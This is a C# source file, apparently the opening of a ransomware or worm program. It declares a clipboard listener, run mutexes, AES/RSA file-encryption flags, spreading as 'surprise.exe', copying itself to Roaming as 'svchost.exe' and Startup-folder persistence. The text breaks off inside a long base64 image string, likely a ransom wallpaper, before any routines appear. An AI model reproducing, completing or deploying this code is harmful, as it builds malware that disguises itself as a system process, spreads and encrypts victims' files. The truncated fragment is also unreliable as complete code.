using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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